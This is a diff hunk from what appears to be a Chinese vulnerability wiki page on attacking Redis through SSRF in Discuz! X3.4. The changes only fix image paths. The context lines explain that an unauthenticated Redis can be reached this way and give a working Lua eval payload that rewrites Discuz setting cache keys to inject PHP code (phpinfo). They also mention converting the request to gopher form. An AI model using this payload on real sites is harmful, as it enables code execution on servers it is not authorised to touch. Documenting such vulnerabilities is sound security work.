@@ -17,20 +17,20 @@ Discuz x3.4
 类似地，Dz 整合 Redis
 配置成功后，默认情况下网站首页右下角会出现`Redis On`的标志：
 
-![](/Users/aresx/Documents/VulWiki/.resource/Discuz!X3.4ssrf攻击redis/media/rId24.jpg)
+![](./.resource/Discuz!X3.4ssrf攻击redis/media/rId24.jpg)
 
 SSRF 攻击 Redis 步骤实际上就比攻击 Memcache 简单了，因为 Redis 支持 lua
 脚本，可以直接用 lua
 脚本获取缓存键名而无需再去猜解前缀。当然能成功攻击的前提是 Redis
 没有配置密码认证，Discuz requirepass 那一项为空：
 
-![](/Users/aresx/Documents/VulWiki/.resource/Discuz!X3.4ssrf攻击redis/media/rId25.jpg)
+![](./.resource/Discuz!X3.4ssrf攻击redis/media/rId25.jpg)
 
 Redis 交互命令行执行 lua 脚本：
 
     eval "local t=redis.call('keys','*_setting'); for i,v in ipairs(t) do redis.call('set', v, 'a:2:{s:6:\"output\";a:1:{s:4:\"preg\";a:2:{s:6:\"search\";a:1:{s:7:\"plugins\";s:4:\"/.*/\";}s:7:\"replace\";a:1:{s:7:\"plugins\";s:9:\"phpinfo()\";}}}s:13:\"rewritestatus\";i:1;}') end; return 1;" 0
 
-![](/Users/aresx/Documents/VulWiki/.resource/Discuz!X3.4ssrf攻击redis/media/rId26.jpg)
+![](./.resource/Discuz!X3.4ssrf攻击redis/media/rId26.jpg)
 
 同样地，对这个过程抓包，将数据包改成 gopher 的形式：
 
